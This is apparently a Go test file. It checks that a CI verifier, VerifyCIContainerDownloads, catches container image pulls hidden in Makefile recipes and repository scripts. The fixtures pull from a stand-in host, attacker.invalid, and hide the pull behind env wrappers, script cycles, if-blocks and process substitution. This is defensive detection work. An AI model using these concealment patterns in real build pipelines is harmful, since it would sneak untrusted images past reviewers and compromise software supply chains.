package releaseverify

import (
	"path/filepath"
	"testing"
)

func TestVerifyCIContainerDownloadsRejectsAcquisitionInReachableRepositoryScripts(t *testing.T) {
	tests := map[string]struct {
		recipe  string
		scripts map[string]string
	}{
		"direct Docker acquisition": {
			recipe: `./scripts/indirect-acquire.sh`,
			scripts: map[string]string{
				"indirect-acquire.sh": "#!/usr/bin/env bash\nset -euo pipefail\ndocker pull attacker.invalid/image:pinned\n",
			},
		},
		"wrapped Buildah acquisition": {
			recipe: `MODE=ci env TRACE=1 command bash ./scripts/indirect-acquire.sh`,
			scripts: map[string]string{
				"indirect-acquire.sh": "#!/usr/bin/env bash\nset -euo pipefail\nenv buildah pull attacker.invalid/image:pinned\n",
			},
		},
		"cycle reaches acquisition": {
			recipe: `bash ./scripts/indirect-a.sh`,
			scripts: map[string]string{
				"indirect-a.sh": "#!/usr/bin/env bash\n./scripts/indirect-b.sh\n",
				"indirect-b.sh": "#!/usr/bin/env bash\n./scripts/indirect-a.sh\ndocker pull attacker.invalid/image:pinned\n",
			},
		},
	}
	for name, test := range tests {
		t.Run(name, func(t *testing.T) {
			root := writeCIContainerDownloadsFixture(t)
			for name, source := range test.scripts {
				writeFixtureExecutable(t, filepath.Join(root, "scripts", name), source)
			}
			writeFixtureFile(t, filepath.Join(root, "mk", "indirect-script.mk"), ".PHONY: android\nandroid:\n\t"+test.recipe+"\n")
			appendMakeInclude(t, root, "mk/indirect-script.mk")
			writeFixtureFile(t, filepath.Join(root, ".github", "workflows", "ci-android.yml"), readRepositoryWorkflow(t, "ci-android.yml"))
			if err := VerifyCIContainerDownloads(root); err == nil {
				t.Fatal("VerifyCIContainerDownloads accepted acquisition hidden in a reachable repository script")
			}
		})
	}
}

func TestVerifyCIContainerDownloadsRejectsAcquisitionAddedToSourceBoundWorkflowScript(t *testing.T) {
	root := writeCIContainerDownloadsFixture(t)
	writeFixtureExecutable(t, filepath.Join(root, "scripts", "merge-release-digests.sh"), "#!/usr/bin/env bash\nset -euo pipefail\ndocker pull attacker.invalid/image:pinned\n")
	if err := VerifyCIContainerDownloads(root); err == nil {
		t.Fatal("VerifyCIContainerDownloads accepted acquisition added behind an unchanged source-bound workflow command")
	}
}

func TestVerifyCIContainerDownloadsTraversesBenignRepositoryScriptCyclesOnce(t *testing.T) {
	root := writeCIContainerDownloadsFixture(t)
	writeFixtureExecutable(t, filepath.Join(root, "scripts", "cycle-a.sh"), "#!/usr/bin/env bash\n./scripts/cycle-b.sh\n")
	writeFixtureExecutable(t, filepath.Join(root, "scripts", "cycle-b.sh"), "#!/usr/bin/env bash\n./scripts/cycle-a.sh\nprintf 'benign cycle\\n'\n")
	writeFixtureFile(t, filepath.Join(root, "mk", "benign-cycle.mk"), ".PHONY: android\nandroid:\n\t./scripts/cycle-a.sh\n")
	appendMakeInclude(t, root, "mk/benign-cycle.mk")
	writeFixtureFile(t, filepath.Join(root, ".github", "workflows", "ci-android.yml"), readRepositoryWorkflow(t, "ci-android.yml"))
	if err := VerifyCIContainerDownloads(root); err != nil {
		t.Fatalf("benign repository-script cycle changed container policy: %v", err)
	}
}

func TestVerifyCIContainerDownloadsRejectsAcquisitionInShellControlStructures(t *testing.T) {
	commands := map[string]string{
		"if then Docker pull":         `if true; then docker pull attacker.invalid/image:pinned; fi`,
		"if then wrapped Buildah":     `if false; then env buildah pull attacker.invalid/image:pinned; else true; fi`,
		"input process substitution":  `cat <(docker pull attacker.invalid/image:pinned)`,
		"output process substitution": `cat > >(command buildah pull attacker.invalid/image:pinned)`,
	}
	for name, command := range commands {
		t.Run(name, func(t *testing.T) {
			root := writeCIContainerDownloadsFixture(t)
			writeFixtureFile(t, filepath.Join(root, "mk", "shell-control.mk"), ".PHONY: android\nandroid:\n\t"+command+"\n")
			appendMakeInclude(t, root, "mk/shell-control.mk")
			writeFixtureFile(t, filepath.Join(root, ".github", "workflows", "ci-android.yml"), readRepositoryWorkflow(t, "ci-android.yml"))
			if err := VerifyCIContainerDownloads(root); err == nil {
				t.Fatal("VerifyCIContainerDownloads accepted acquisition hidden in shell control syntax")
			}
		})
	}
}
